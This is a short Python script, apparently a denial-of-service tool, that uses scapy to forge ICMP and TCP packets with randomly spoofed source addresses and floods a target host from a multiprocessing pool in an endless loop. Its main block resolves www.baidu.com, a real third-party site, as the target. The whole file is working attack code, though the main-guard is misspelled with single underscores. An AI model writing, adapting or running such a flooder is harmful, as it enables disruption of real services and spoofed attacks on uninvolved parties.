import multiprocessing
from random import randint
from scapy.all import*
def scapy_send_one(host):
    a = randint(1,255)
    b = randint(1, 255)
    c = randint(1, 255)
    d = randint(1, 255)
    source_ip = str(a)+'.'+str(b)+'.'+str(c)+'.'+str(d)
    id_ip = randint(1, 65535)
    send(IP(src=source_ip, dst=host, id=id_ip) / ICMP() /"hello", verbose=False)
    send(IP(src=source_ip, dst=host, id=id_ip) / TCP() / "hello", verbose=False)
def scapy_dos(host,processes):
    pool = multiprocessing.Pool(processes = processes)#创建进程池
    while 1:
        try:
            pool.apply_async(scapy_send_one,(host,))
        except:
            pool.terminate()
if _name_=='_main_':
    ip = socket.getaddrinfo("www.baidu.com", None)[0][4][0]
    scapy_send_one(ip)